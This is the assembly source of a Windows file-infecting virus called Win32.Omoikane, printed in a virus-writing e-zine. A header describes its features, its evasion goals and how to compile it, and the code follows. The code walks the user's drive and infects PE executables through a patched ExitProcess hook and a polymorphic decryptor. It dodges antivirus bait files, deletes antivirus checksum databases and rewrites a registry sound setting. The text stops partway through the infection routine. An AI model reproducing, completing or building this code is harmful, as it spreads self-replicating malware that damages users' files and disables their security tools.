 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 ---------------------------- Win32.Omoikane )=-
 -=( ---------------------------------------------------------------------- )=-

 -=( 0 : Win32.Omoikane Features ------------------------------------------ )=-

 Imports:       GetModuleHandleA  and  ExitProcess from host,  rest  are direct
                from Kernel32
 Infects:       PE  files  containing  GetModuleHandleA.    Expands  last  code
                section, write decryptor to code section.   ExitProcess of host
                patched to run decryptor, which decrypts the virus into a large
                enough data section.  Write bit not set on the code section.
 Strategy:      Does a traversal starting at the root dir on the current  drive
                picking random sub-directories,  stopping when either there are
                no more directories, or some new files were infected.
 Compatibility: All tested windows versions, doesn't infect SFCs
 Saves Stamps:  Yes
 MultiThreaded: No
 Polymorphism:  A small slow-polymorphic decryptor in the empty space at end of
                the  code segment  which uses a  series of  randomly  generated
                encryption instructions, and a couple algorithms.
 AntiAV / EPO:  Runs on ExitProcess.    Anti-bait:   Does not infect goat files
                (small, incorrect make-up, weird filenames, etc) or anything in
                goat directories (too many exes, same sizes, etc).
 SEH Abilities: None
 Payload:       1/8 times,  writes baka.wav into the windows directory and sets
                the registry to use it as the new Critical Error sound   (heard
                when an application crashes).

 -=( 1 : Win32.Omoikane Design Goals -------------------------------------- )=-

 : Infect PE files without adding a second code section
 : NOT setting the write bit on a code section
 : Use Good Encryption

 This virus was created to see if the above objectives were feasible.  With the
 advent of the PE  executable and advances in  the anti-virus industry, new  PE
 viruses are generally easy  prey for AVs due  to one or more  of the following
 reasons:

 : Entry point outside the code section.  Some compression engines do this too,
   but any AV which this does not red-flag is crap.
 : Writable Code section.   Almost no  clean exe has this bit set.   Almost all
   viruses do.... hmm... I wonder if the AV noticed this?
 : Lousy  Encryption.    As  written  in  Matrix#2,  AVs  can  cut  through bad
   encryption methods as if they were not there.

 Thus, this virus was born.

 This virus, hides it's body in the last section of the host file (encrypted of
 course).  It writes a small, POLYMORPHIC decryptor into the slack space at the
 end of the  code section.  It  then patches the  exe by looking  for all "call
 [ExitProcess]" or "jmp [ExitProcess]" (depending on the linker) to jump to the
 decryptor.  Since all calls are patched, no other infection marker is needed.

 When the  host finishes  running and  calls ExitProcess,  it will  jump to the
 polymorphic  decryptor.    The decryptor  then decrypts  the data in the  last
 section of the file, and places it into a writable data section.   Due to  how
 windows "works", data sections CAN have code in them.  After the virus is done
 decrypting, it jumps to the code in the data section and executes.

 When the virus executes, it goes into the root directory of the current  drive
 and attempts  to infect  files.  If  there are  no files  to infect, or a bait
 directory  is determined  (using a  complex set  of criteria),  then a  random
 subdirectory is chosen,  and the infection process is repeated.   (You can use
 "subst"  to create  a new  drive letter  and run  the file  on it  to test  it
 safely.)

 ...And so, some 2000 lines of code later - Mission Accomplished.

 -=( 2 : Win32.Omoikane Design Faults ------------------------------------- )=-

 The biggest problem is the  reliance on GetModuleHandleA being present  in the
 host file.  The  other large problem  is the inability  to go hoping  from one
 drive to the next.

 There are various other things that, time permitting, should be improved.  For
 example adding more methods of  encryption, and lots of optimization.  But for
 now...

 -=( 3 : Win32.Omoikane Disclaimer ---------------------------------------- )=-

 THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
 COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
 BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
 YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.

 COPYRIGHT
 Copyright on  materials in  this  magazine  and  the  information  therein and
 their  arrangement is owned by FEATHERED SERPENTS  unless otherwise indicated.

 RIGHTS AND LIMITATIONS
 You have  the  right  to use,    copy and  distribute  the  material in   this
 magazine free   of  charge,  for  all   purposes  allowed  by your   governing
 laws.  You    are expressly  PROHIBITED   from   using the  material contained
 herein  for   any   purposes  that   would   cause    or would    help promote
 the illegal   use of the material.

 NO WARRANTY
 The  information   contained within   this  magazine  are  provided  "as  is".
 FEATHERED    SERPENTS     do    not    warranty    the     accuracy, adequacy,
 or   completeness     of     given  information,  and    expressly   disclaims
 liability   for   errors   or   omissions    contained  therein.   No implied,
 express, or statutory  warranty, is given  in conjunction with  this magazine.

 LIMITATION OF LIABILITY
 In *NO* event will FEATHERED SERPENTS or any of its MEMBERS be liable for  any
 damages  including  and  without  limitation,  direct  or  indirect,  special,
 incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
 connection with this magazine, or the use thereof.

 ADDITIONAL DISCLAIMER
 Computer viruses will spread of their own accord between computer systems, and
 across international boundaries.  They are raw animals with no concern for the
 law, and for that reason your possession of them makes YOU responsible for the
 actions they carry out.

 The viruses provided in this magazine are for educational purposes ONLY.  They
 are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
 conditions.  If compiled and executed these viruses WILL land you in court(s).

 You will be held responsible for your actions.  As  source code these  viruses
 are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
 countries.  In  binary form  these viruses  are malicious  weapons.  FEATHERED
 SERPENTS do not condone the application of these viruses and will NOT be  held
 LIABLE for any MISUSE.

 -=( 4 : Win32.Omoikane Compile Instructions ------------------------------ )=-

 TASM32 5.0  &  TLINK32 1.6.71.0

 tasm32 /m /ml Omoikane.asm
 tlink32 /Tpe /x Omoikane.obj, Omoikane.exe,,import32.lib
 pewrsec Omoikane.exe

 -=( 5 : Win32.Omoikane --------------------------------------------------- ) `

%out Assembling file implies acceptance of disclaimer inside source code

DEBUG           equ     0               ; Toggle Slow/Fast Poly, etc
DEBUGENTRY      equ     0               ; decryptor starts with an 'int 3'
DEBUGROOTDIR    equ     0               ; 0= root dir, 1= 'goats' subdir

if DEBUG
MINCODESIZE     equ     100h            ; Min Raw size of host's CS
MINHOSTSIZE     equ     100h
else
MINCODESIZE     equ     1000h
MINHOSTSIZE     equ     10000h          ; bad exe if < 10000h bytes
endif
MINSLACKSPACE   equ     50              ; Need at least 50 bytes at end of CS
MAXEXEPERDIR    equ     30              ; over 25 exes and skip dir
MAXBADEXE       equ     7               ; 7 bad exes before skipping dir
MAXSAMESIZE     equ     3               ; 3 same size files = goat dir
MAXSIZEPATTERN  equ     3               ; 3 exes in same size increments.


.386
.model flat, stdcall

; ************************************************************************
;  Declarations
; ************************************************************************
GetModuleHandleA        PROCDESC        WINAPI  :DWORD

OPEN_EXISTING           equ     3
FILE_SHARE_WRITE        equ     0002h
FILE_BEGIN              equ     0
FILE_MAP_WRITE          equ     2
FILE_ATTRIBUTE_NORMAL   equ     00000080h
INVALID_HANDLE_VALUE    equ     0FFFFFFFFh
GENERIC_READ            equ     80000000h
GENERIC_WRITE           equ     40000000h
MAX_PATH                equ     260
CREATE_ALWAYS           equ     2
PAGE_READWRITE          equ     00000004h
HKEY_USERS              equ     80000003h
REG_SZ                  equ     1
FILE_ATTRIBUTE_DIRECTORY        equ     00000010h

WIN32_FIND_DATA         struct
fd_dwFileAttributes     dd      0
fd_ftCreationTime       dd      0, 0
fd_ftLastAccessTime     dd      0, 0
fd_ftLastWriteTime      dd      0, 0
fd_nFileSizeHigh        dd      0
fd_nFileSizeLow         dd      0
fd_dwReserved0          dd      0
fd_dwReserved1          dd      0
fd_cFileName            db      260 dup(0)
fd_cAlternateFileName   db      14 dup(0)
WIN32_FIND_DATA         ends

FILETIME                struct
ft_dwLowDateTime        dd      0
ft_dwHighDateTime       dd      0
FILETIME                ends


; -****************-
;  PE Header format
; -****************-

PEHEADER struct
                ID                              dd      ?
                Machine                         dw      ?
                NumberOfSections                dw      ?
                TimeDateStamp                   dd      ?
                PointerToSymbolTable            dd      ?
                NumberOfSymbols                 dd      ?
                SizeOfOptionalHeader            dw      ?
                Characteristics                 dw      ?
; Optional Header:
                MagicNumber                     dw      ?
                MajorLinkerVersion              db      ?
                MinorLinkerVersion              db      ?
                SizeOfCode                      dd      ?
                SizeOfInitializedData           dd      ?
                SizeOfUninitializedData         dd      ?
                AddressOfEntryPoint             dd      ?
                BaseOfCode                      dd      ?
                BaseOfData                      dd      ?
                ImageBase                       dd      ?
                SectionAlignment                dd      ?
                FileAlignment                   dd      ?
                MajorOperatingSystemVersion     dw      ?
                MinorOperatingSystemVersion     dw      ?
                MajorImageVersion               dw      ?
                MinorImageVersion               dw      ?
                MajorSubsystemVersion           dw      ?
                MinorSubsystemVersion           dw      ?
                Reserved1                       dd      ?
                SizeOfImage                     dd      ?
                SizeOfHeaders                   dd      ?
                CheckSum                        dd      ?
                Subsystem                       dw      ?
                DllCharacteristics              dw      ?
                SizeOfStackReserve              dd      ?
                SizeOfStackCommit               dd      ?
                SizeOfHeapReserve               dd      ?
                SizeOfHeapCommit                dd      ?
                LoaderFlags                     dd      ?
                NumberOfRvaAndSizes             dd      ?
                DataDirectory                   dd      20 dup (?)
PEHEADER ends

; Data Directory
; --------------
DIR_EXPORT_TABLE                equ     0
DIR_IMPORT_TABLE                equ     1
DIR_RESOURCE_TABLE              equ     2
DIR_EXCEPTION_TABLE             equ     3
DIR_SECURITY_TABLE              equ     4
DIR_FIXUP_TABLE                 equ     5
DIR_DEBUG_TABLE                 equ     6
DIR_IMAGE_DESCRIPTION           equ     7
DIR_MACHINE_SPECIFIC_DATA       equ     8
DIR_THREAD_LOCAL_STORAGE        equ     9
DIR_LOAD_CONFIG                 equ     10
DIR_BOUND_IMPORT                equ     11
DIR_IMPORT_ADDRESS_TABLE        equ     12


; -*******************-
;  Export Table format
; -*******************-

EXPORTHEADER struct
                UnusedCharacteristics           dd      ?
                DateTimeStamp                   dd      ?
                MajorVersion                    dw      ?
                MinorVersion                    dw      ?
                Name                            dd      ?
                Base                            dd      ?
                NumberOfFunctions               dd      ?
                NumberOfNames                   dd      ?
                AddressOfFunctions              dd      ?
                AddressOfNames                  dd      ?
                AddressOfNameOrdinals           dd      ?
EXPORTHEADER ends


; -**************************-
;  Section Table Entry format
; -**************************-

SECTION struct
                sec_Name                        db      8 dup (?)
                sec_VirtualSize                 dd      ?
                sec_VirtualAddress              dd      ?
                sec_SizeOfRawData               dd      ?
                sec_PointerToRawData            dd      ?
                sec_PointerToRelocations        dd      ?
                sec_PointerToLinenumbers        dd      ?
                sec_NumberOfRelocations         dw      ?
                sec_NumberOfLineNumbers         dw      ?
                sec_Characteristics             dd      ?
SECTION ends

; Section Characteristics flags
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC_CODE                equ     00000020h
SEC_INITIALIZED_DATA    equ     00000040h
SEC_UNINITIALIZED_DATA  equ     00000080h
SEC_NO_CACHE            equ     04000000h
SEC_NOT_PAGEABLE        equ     08000000h
SEC_SHARED              equ     10000000h
SEC_EXECUTABLE          equ     20000000h
SEC_READ                equ     40000000h
SEC_WRITE               equ     80000000h


; -*******************-
;  Import Table format
; -*******************-

IMPORTTABLE struct
                imp_Characteristics             dd      ?
                imp_DateTimeStamp               dd      ?
                imp_ForwarderChain              dd      ?
                imp_Name                        dd      ?
                imp_FirstThunk                  dd      ?
IMPORTTABLE ends



; ************************************************************************
;               Data Segment (empty)
; ************************************************************************
.data
dummy db 0





; ************************************************************************
;
;               Code Segment
;
; ************************************************************************


.code
VIRUSTOTALSIZE  equ     offset VirusEnd - offset VirusStart
VIRUSCODESIZE   equ     offset VirusInitEnd - offset VirusStart
filesize        equ     7045
BakaFileSize    equ     8


HOST:
        xor     ebp, ebp
        call    GetModuleHandleA, offset nKernel32
        jmp     short SkipInFirstGeneration

VirusStart:
        call    Get_Delta
Get_Delta:
        pop     ebp
        sub     ebp, offset Get_Delta

        lea     eax, nKernel32+ebp
        push    eax
        dw      15FFh           ; Call [var containing offset GetModuleHandle]
GetModHandleAddy dd     0

SkipInFirstGeneration:
;-*********************************-
; Get other function addresses from
;  the export table of Kernel32.dll
;-*********************************-
GetFunctions:
        mov     ebx, dword ptr [eax+3Ch]                ; RVA of PE Header
        mov     ebx, dword ptr [ebx+eax].DataDirectory[0]

        mov     ecx, dword ptr [ebx+eax].NumberOfNames  ; Number of Names
        mov     NumOfNames+ebp, ecx

        xor     ecx, ecx                                ; Currently at Name 1
        mov     edi, dword ptr [ebx+eax].AddressOfNames ; Address of Names
        mov     edx, dword ptr [ebx+eax].AddressOfFunctions     ; RVAs of functions
        add     edx, eax
        mov     ebx, dword ptr [ebx+eax].AddressOfNameOrdinals ; Ordinals
        add     ebx, eax
FindAddress:
        mov     esi, dword ptr [edi+eax]
        add     esi, eax
        push    edi
        lea     edi, nGetProcAddr+ebp
        push    ecx
        mov     ecx, 15
        repz    cmpsb
        pop     ecx
        pop     edi
        jz      short Match
        add     edi, 4
        inc     ecx
        cmp     ecx, NumOfNames+ebp
        jnge    FindAddress

OhShitFailImport:
        dw      15FFh           ; Call [var containing offset ExitProcess]
EmergencyExitAddy dd    0       ; (exit value should be on stack from host)

Match:
        movzx   ecx, word ptr [ebx+2*ecx]
        mov     ecx, dword ptr [edx+4*ecx]
        add     ecx, eax

        mov     ebx, eax
        mov     _GetProcAddress+ebp, ecx
; GetProcAddress is now in ecx....

; Now import the rest of the needed functions
        lea     esi, InfFunctions+ebp
        lea     edi, InfDest+ebp
InfGetFuncLoop:
        lodsb
        movzx   ecx, al
        jecxz   InfImpDone
        push    esi
        add     esi, ecx
        call    _GetProcAddress+ebp, ebx
        or      eax,eax
        jz      OhShitFailImport
        stosd
        jmp     InfGetFuncLoop
InfImpDone:

        call    LoadSFC                         ; Load SFC Library if exists
        db      'sfc.dll',0
LoadSFC:
        call    _LoadLibraryA+ebp
        mov     SFCLib+ebp, eax
        or      eax,eax
        jz      short NoSFCdll                  ; Probably 95 or 98
        call    PushSFCfunc
        db      'SfcIsFileProtected',0
PushSFCfunc:
        call    _GetProcAddress+ebp, eax
NoSFCdll:
        mov     _SfcIsFileProtected+ebp, eax


        lea     eax, DirBuf+ebp
        call    _GetCurrentDirectoryA+ebp, 256, eax
        lea     eax, RootDir+ebp
        call    _SetCurrentDirectoryA+ebp, eax
        lea     eax, CurrentTime+ebp
        call    _GetSystemTimeAsFileTime+ebp, eax
        ror     CurrentTime.ft_dwLowDateTime+ebp, 5     ; Get rid of ending 0s

;>>>>>----------------------------------------------------------------<<<<<

; ****** Payload start here ******
; (makes baka.wav play when a program crashes)
        test    CurrentTime.ft_dwLowDateTime+ebp, 7     ; 1 in 8 times
        jnz     SearchNewDir

        lea     edi, buffer+ebp
        call    _GetWindowsDirectoryA+ebp, edi, MAX_PATH
        push    edi
        add     edi, eax
        lea     esi, bakafile+ebp
        push    10
        pop     ecx
        rep     movsb
        pop     edi
        mov     esi, ecx

        call    _CreateFileA+ebp, edi, GENERIC_READ+GENERIC_WRITE, esi, esi, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, esi
        or      eax, eax
        js      ExitPayload
        push    eax                             ; Push FileHandle
        call    _CreateFileMappingA+ebp, eax, esi, PAGE_READWRITE, esi, filesize, esi
        or      eax, eax
        je      CloseAndExitPayload
        call    _MapViewOfFile+ebp, eax, FILE_MAP_WRITE, esi, esi, esi
        push    eax                             ; Push Memory Addy

        xchg    eax, edi
        lea     esi, BakaWav+ebp
        mov     edx, filesize
        push    ebp
        call    decode
        pop     ebp

        call    PushRegLibName                  ; Load the Reg* functions
        db      'ADVAPI32',0
PushRegLibName:
        call    _LoadLibraryA+ebp
        push    eax

        xchg    eax, ebx
        lea     esi, RegFunctions+ebp
        lea     edi, RegFuncDest+ebp
        call    FillImports
        jc      short FreeLibAndExit
        lea     eax, RegKey+ebp
        lea     ecx, RegHnd+ebp
        call    _RegOpenKeyA+ebp, HKEY_USERS, eax, ecx
        mov     ebx, RegHnd+ebp
        push    ebx

        lea     eax, RegKey+ebp
        lea     ecx, bakafile+1+ebp
        call    _RegSetValueA+ebp, HKEY_USERS, eax, REG_SZ, ecx, BakaFileSize
CloseKeyAndExit:
        call    _RegCloseKey+ebp
FreeLibAndExit:
        call    _FreeLibrary+ebp
CloseAndExitPayload:
        call    _UnmapViewOfFile+ebp
        call    _CloseHandle+ebp
ExitPayload:
        call    _CloseHandle+ebp
; ****** Payload end here ******


SearchNewDir:
        lea     ecx, FileMaskAny+ebp
        lea     edx, FindFile+ebp
        call    _FindFirstFileA+ebp,  ecx, edx
        mov     SearchHnd+ebp, eax
        cmp     eax, INVALID_HANDLE_VALUE
        je      ExitProgram

        xor     eax, eax
        mov     NumInfected+ebp, al
        mov     AVCRCFlag+ebp, al
        mov     NonExeCount+ebp, eax
        mov     DirCount+ebp, eax
        mov     ExeGoodCount+ebp, eax
        mov     ExeBadCount+ebp, eax
        mov     ExeSizesPtr+ebp, eax

ScanDirLoop:
        call    GetShortFileName

        test    FindFile.fd_dwFileAttributes+ebp, FILE_ATTRIBUTE_DIRECTORY
        jnz     ScanDirStats

; ************************
; Check if File is an .EXE
; ************************
        mov     edi, esi
        mov     al, 0
        mov     ecx, 255 ; (13 should be enough, but if long...)
        repnz   scasb
        cmp     dword ptr [edi-5], 'EXE.'
        jne     IncNonExeCount

; *****************************
; Check if File is not known AV
; *****************************
        lea     edi, AVNames+ebp                ; Check if AV - load names
CheckVsAV:
        movzx   ecx, byte ptr [edi]             ; Load length of name
        inc     edi                             ; skip past length byte
        or      ecx,ecx                         ; Is length zero?
        jz      short NotAVName                 ;  Yes - passed AV check
        push    esi                             ; Save Filename
        repz    cmpsb                           ; Compare
        pop     esi                             ; Restore FileName
        jz      AbortDir                        ; Oh oh - match (skip dir)
        add     edi, ecx                        ; Goto next AV Name
        jmp     CheckVsAV
NotAVName:

; *******************
; Possible Goat File?
; *******************

        call    ExeTest
        jc      IncExeBadCount
        inc     ExeGoodCount+ebp

        mov     ecx, ExeSizesPtr+ebp            ; Store file sizes for analyses
        cmp     ecx, MAXEXEPERDIR
        je      short GetNextScanFile
        mov     eax, FindFile.fd_nFileSizeLow+ebp
        mov     [offset ExeSizes + 4*ecx + ebp], eax
        inc     ExeSizesPtr+ebp

GetNextScanFile:
        lea     ecx, FindFile+ebp
        call    _FindNextFileA+ebp, SearchHnd+ebp, ecx
        or      eax, eax
        jnz     ScanDirLoop
        call    _FindClose+ebp, SearchHnd+ebp

; Check if probable goat directory
        mov     eax, ExeGoodCount+ebp
        mov     ebx, ExeBadCount+ebp
        mov     ecx, NonExeCount+ebp

        cmp     eax, 0
        je      GotoNextDir

        cmp     ebx, MAXBADEXE          ; Too many possible goats?
        ja      GotoNextDir
        cmp     eax, ebx                ; More bad EXEs than goods?
        jb      GotoNextDir
        add     ebx, eax                ; Too Many EXEs?
        cmp     ebx, MAXEXEPERDIR
        ja      GotoNextDir
        cmp     ebx, ecx                ; Too high a ratio of EXEs?
        ja      GotoNextDir

        cmp     eax, MAXSAMESIZE
        jbe     short FindExes
        mov     ecx, ExeSizesPtr+ebp    ; Bubble Sort Exe Sizes
        dec     ecx
        lea     edi, ExeSizes+ebp
        xor     ebx, ebx
BubbleLoop1:
        lea     edx, [ebx+1]
BubbleLoop2:
        mov     eax, [edi + 4*ebx]
        cmp     eax, [edi + 4*edx]
        jbe     short BubbleNoSwap
        xchg    [edi + 4*edx], eax
        mov     [edi + 4*ebx], eax
BubbleNoSwap:
        inc     edx
        cmp     edx, ecx
        jbe     BubbleLoop2
        inc     ebx
        cmp     ebx, ecx
        jb      BubbleLoop1

        xor     ebx, ebx        ; Num of same increments
        xor     edx, edx        ; Num of files with same size as another
        xor     esi, esi        ; Size of last increment (init to -1)
        dec     esi
ExeSizeLoop:
        mov     eax, [edi+4*ecx]
        sub     eax, [edi+4*ecx-4]
        jnz     short ExesNotSameSize
        inc     edx
        cmp     edx, MAXSAMESIZE-1
        jae     GotoNextDir
        jmp     short NoSizePattern
ExesNotSameSize:
        xor     edx, edx
        xchg    eax, esi
        cmp     eax, esi
        jne     short NoSizePattern
        inc     ebx
NoSizePattern:
        loop    ExeSizeLoop
        cmp     ebx, MAXSIZEPATTERN
        jae     GotoNextDir

FindExes:
        lea     ecx, FileMaskExe+ebp
        lea     edx, FindFile+ebp
        call    _FindFirstFileA+ebp,  ecx, edx
        mov     SearchHnd+ebp, eax
FindExeLoop:

        call    GetShortFileName
        call    ExeTest
        jc      short FindNextExe

        lea     eax, FindFile.fd_cFileName+ebp
        call    _SetFileAttributesA+ebp, eax, FILE_ATTRIBUTE_NORMAL
        or      eax, eax                        ; Set Attributes OK?
        je      short FindNextExe               ;  No- oh oh.  Network?

        push    CurrentTime.ft_dwHighDateTime+ebp       ; Save seed (rand slow)
        shr     CurrentTime.ft_dwHighDateTime+ebp, 12   ; Divide by 40 days
        call    InfectTheFileAlready                    ; About time, huh?
        pop     CurrentTime.ft_dwHighDateTime+ebp       ; restore seed


        lea     eax, FindFile.fd_cFileName+ebp
        call    _SetFileAttributesA+ebp, eax, FindFile.fd_dwFileAttributes+ebp

FindNextExe:
        lea     ecx, FindFile+ebp
        call    _FindNextFileA+ebp, SearchHnd+ebp, ecx
        or      eax, eax
        jnz     FindExeLoop
AbortDir:
        call    _FindClose+ebp, SearchHnd+ebp
        cmp     NumInfected+ebp, 0              ; Exit if done infection
        jne     RemoveCRCsAndExit

GotoNextDir:
        mov     ecx, DirCount+ebp               ; Exit if no more dirs
        or      ecx, ecx
        jz      ExitProgram

        call    randomfast
        xor     edx, edx
        div     ecx
        inc     edx
        mov     DirCount+ebp, edx
        lea     ecx, FileMaskAny+ebp
        lea     edx, FindFile+ebp
        call    _FindFirstFileA+ebp, ecx, edx
        xchg    eax, ebx
ChangeDirLoop:
        test    FindFile.fd_dwFileAttributes+ebp, FILE_ATTRIBUTE_DIRECTORY
        jz      short FindDir
        cmp     byte ptr FindFile.fd_cFileName+ebp, '.'
        je      short FindDir
        dec     DirCount+ebp
        jz      short ChangeToDir
FindDir:
        lea     ecx, FindFile+ebp
        call    _FindNextFileA+ebp, ebx, ecx
        jmp     short ChangeDirLoop
ChangeToDir:
        call    _FindClose+ebp, ebx
        lea     ecx, FindFile.fd_cFileName+ebp
        call    _SetCurrentDirectoryA+ebp, ecx
        jmp     SearchNewDir

IncExeBadCount:
        inc     ExeBadCount+ebp
        jmp     GetNextScanFile

ScanDirStats:
        cmp     byte ptr [esi], '.'
        je      GetNextScanFile
        inc     DirCount+ebp
        jmp     GetNextScanFile

IncNonExeCount:
        lea     edi, CRCNames+ebp
        xor     edx, edx
        inc     edx
CRCNameLoop:
        movzx   ecx, byte ptr [edi]
        inc     edi
        or      ecx, ecx
        jz      short CRCNamePass
        push    esi
        repz    cmpsb
        pop     esi
        jz      short CRCNameFail
        add     edi, ecx
        shl     edx, 1
        jmp     CRCNameLoop
CRCNameFail:
        or      AVCRCFlag+ebp, dl
        jmp     short ExitIncNonExeCount
CRCNamePass:
        inc     NonExeCount+ebp
ExitIncNonExeCount:
        jmp     GetNextScanFile

; Remove any AV CRCs....
RemoveCRCsAndExit:
        lea     edi, CRCNames+ebp
        xor     esi, esi
        inc     esi
RemoveAVCRCs:
        movzx   ebx, byte ptr [edi]
        or      ebx, ebx
        jz      short ExitProgram
        inc     edi
        test    dword ptr AVCRCFlag+ebp, esi
        jnz     short DeleteAVCRC
NextCRCRemove:
        shl     esi, 1
        add     edi, ebx
        jmp     RemoveAVCRCs
DeleteAVCRC:
        call    _SetFileAttributesA+ebp, edi, FILE_ATTRIBUTE_NORMAL
        call    _DeleteFileA+ebp, edi
        jmp     NextCRCRemove

ExitProgram:
        mov     ecx, SFCLib+ebp                         ;  Free SFC lib if loaded
        jecxz   NoSFCFreeLib
        call    _FreeLibrary+ebp, ecx
NoSFCFreeLib:
        lea     eax, DirBuf+ebp
        call    _SetCurrentDirectoryA+ebp, eax
        call    _ExitProcess+ebp, 0


; ********************************
; esi=short filename from FindFile
; ********************************
GetShortFileName:
        lea     esi, FindFile.fd_cAlternateFileName+ebp
        cmp     byte ptr [esi], 0               ; Sometimes unused - check
        jne     short GotShortFileName
        lea     esi, FindFile.fd_cFileName+ebp  ; put filename in ds:esi
GotShortFileName:
        ret

; ******************************
;
;   TEST EXE FILE FOR GOAT
;
; ******************************

ExeTest:
; ******************************
; Check if File is not too small
; ******************************
CheckFileSize:
        cmp     dword ptr FindFile.fd_nFileSizeLow+ebp, MINHOSTSIZE
        jb      short ExeTestBad                ; File too small?
; ****************************
; Check if File is not too new
; ****************************
CheckFileTime:
        mov     eax, CurrentTime.ft_dwHighDateTime+ebp
        sub     eax, 1000h
        cmp     eax, FindFile.fd_ftLastWriteTime.ft_dwHighDateTime+ebp
        jb      short ExeTestBad
; ********************************
; Check if File contains long runs
; of letters or contains numbers.
; ********************************
        mov     edi, esi
        mov     byte ptr LetterCount+ebp, 0     ; Currently run of 0 same chars
        mov     byte ptr LastLetter+ebp, 0      ; Reset last letter
        lea     esi, FindFile.fd_cFileName+ebp  ; put long filename in ds:esi
letterloop:
        lodsb                                   ; load letter
        or      al,al                           ; End of filename?  Yes - exit.
        jz      short DoneRunCheck
        cmp     al, '0'                         ; Check if it has file has
        jb      short NextCheck                 ;  numbers in it.  If so, skip.
        cmp     al, '2'
        jb      short ExeTestBad
        cmp     al, '4'
        jb      short NextCheck
        cmp     al, '9'
        jbe     short ExeTestBad
NextCheck:
        xor     bl,bl                           ; Zero Letter Run counter
        cmp     LastLetter+ebp, al              ; Is same as last letter?
        jne     short DoneCheck                 ;  Yes - it's ok.
        mov     bl, LetterCount+ebp             ;  No?  # of letters repeated
        inc     bx                              ; increment LetterCount
        cmp     bl, 2                           ; Is this he third same letter?
        jae     short ExeTestBad                ;  Yes - fail.  Look elsewhere
DoneCheck:
        mov     LastLetter+ebp, al              ; Save last letter
        mov     LetterCount+ebp, bl             ; Save Run count
        jmp     short letterloop                ; Get next letter
DoneRunCheck:
        clc
        ret
ExeTestBad:
        stc
        ret


;>>>>>----------------------------------------------------------------<<<<<
;**********************

InfectTheFileAlready:
        lea     ebx, FindFile.fd_cFileName+ebp
        xor     edi, edi
        mov     ecx, _SfcIsFileProtected+ebp    ; Is SFC protected?
        jecxz   NotSFCProtected
        call    ecx, edi, ebx                   ; call function if present
        or      eax, eax
        jnz     ExitInfector
NotSFCProtected:
        call    _CreateFileA+ebp, ebx, GENERIC_READ+GENERIC_WRITE, FILE_SHARE_WRITE, edi, OPEN_EXISTING, edi, edi
        or      eax, eax
        js      ExitInfector
        push    eax                             ; Push FileHandle
        call    _CreateFileMappingA+ebp, eax, edi, PAGE_READWRITE, edi, edi, edi
        or      eax, eax
        je      CloseAndExitInfector
        push    eax
        xchg    eax, esi
        call    _MapViewOfFile+ebp, esi, FILE_MAP_WRITE, edi, edi, edi
        push    eax                             ; Push Memory Addy
        mov     esi, eax

        cmp     word ptr [eax], 'ZM'                    ; Is it an EXE?
        jne     short InfectableNo
        cmp     word ptr [eax+18h], 40h                 ; A windows EXE?
        jb      short InfectableNo
        movzx   ecx, word ptr [eax+3Ch]
        add     eax, ecx
        cmp     dword ptr [eax], 'EP'                   ; A PE Exe?
        jne     short InfectableNo
        cmp     word ptr [eax].Machine, 14Ch            ; Is at least 386+ ?
        jb      short InfectableNo
        cmp     word ptr [eax].Machine, 160h            ; Is not R3000, etc.?
        jae     short InfectableNo
        cmp     word ptr [eax].Subsystem, 2             ; Is Windows file?
        jb      short InfectableNo                              ;  2=Windows
        cmp     word ptr [eax].Subsystem, 3             ;  3=Console (win)
        jbe     short IsInfectable
InfectableNo:
        jmp     UnmapAndClose
IsInfectable:


; First locate imports:
        xchg    eax, edi
        mov     eax, dword ptr [edi].DataDirectory+8
; Section Table:
        call    RVA2Addr
ImportLoop:
        cmp     [eax].imp_Characteristics, 0
        je      InfectableNo                    ; No Kernel Import?!?
        xchg    eax, edx
        mov     eax, [edx].imp_Name
        call    RVA2Addr
        cmp     dword ptr [eax], 'NREK'
        jne     short TryNextImport
        cmp     dword ptr [eax+4], '23LE'
        je      short FoundKernel
TryNextImport:
        lea     eax, [edx + size IMPORTTABLE]
        jmp     ImportLoop

FoundKernel:                    ; Now find "ExitProcess & GetModuleHandle"
        mov     eax, [edx].imp_Characteristics
        or      eax,eax
        jne     short HNAExists
        mov     eax, [edx].imp_FirstThunk
HNAExists:
        call    RVA2Addr
        mov     ebx, eax
        mov     edi, [edx].imp_FirstThunk
        xor     edx,edx                 ; Import Flags= 0 - nothing yet

FindImportFunction:
        mov     eax, [ebx]
        or      eax,eax
        je      short DoneImports       ; No more imports
        js      short NotGetModuleHandle ; Some psycho is loading by ordinal
        call    RVA2Addr
        inc     eax
        inc     eax
        xchg    eax, edi

        test    dl, 1                   ; Found ExitProcess Already?
        jnz     short NotExitProcess
        mov     ecx, 12
        push    esi
        push    edi
        lea     esi, nExitProcess+ebp
        repz    cmpsb
        pop     edi
        pop     esi
        jne     short NotExitProcess
        or      dl, 1                   ; Mark as found
        mov     ExitProcessRVA+ebp, eax ; Save RVA
NotExitProcess:
        test    dl, 2                   ; Found GetMoguleHandle Already?
        jnz     short NotGetModuleHandle
        mov     ecx, 17
        push    esi
        push    edi
        lea     esi, nGetModuleHandle+ebp
        rep     cmpsb
        pop     edi
        pop     esi
        jne     short NotGetModuleHandle
        or      dl, 2
        mov     GetModuleHandleRVA+ebp, eax
NotGetModuleHandle:
        xchg    eax, edi
        add     ebx, 4                  ; Next Function Name
        add     edi, 4                  ; Get Next Function RVA
        jmp     FindImportFunction

DoneImports:
        cmp     dl, 3                   ; Found both functions?
        jne     InfectableNo

        movzx   ebx, word ptr [esi+3Ch]
        add     ebx, esi
        mov     edi, ebx                ; edi= PE Header offset
        movzx   ecx, [ebx].NumberOfSections
        movzx   edx, word ptr [ebx].SizeOfOptionalHeader
        lea     edx, [ebx+edx+18h]

; Get Last Section
        push    ecx
        push    edx
        mov     eax, [edx].sec_PointerToRawData
        mov     ebx, edx
LastSectionLoop:
        cmp     eax, [edx].sec_PointerToRawData
        jae     short NotLastSection
